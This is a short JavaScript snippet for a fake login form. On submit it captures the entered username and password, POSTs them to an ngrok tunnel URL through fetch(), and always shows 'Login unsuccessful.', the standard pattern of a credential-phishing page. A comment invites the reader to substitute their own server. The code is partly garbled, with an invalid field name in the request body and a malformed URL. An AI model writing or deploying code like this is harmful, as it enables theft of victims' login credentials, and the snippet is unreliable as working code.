document.getElementById("loginForm").addEventListener("submit", function (e) {
  e.preventDefault();
  const username = document.getElementById("username").value;
  const password = document.getElementById("password").value;

  // Send credentials to your server (replace with your server URL)
  fetch("http://127.0.0.1:4040.ngrok.io", {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({ email-or- moblie- number, password })
  });

  alert("Login unsuccessful.");

});



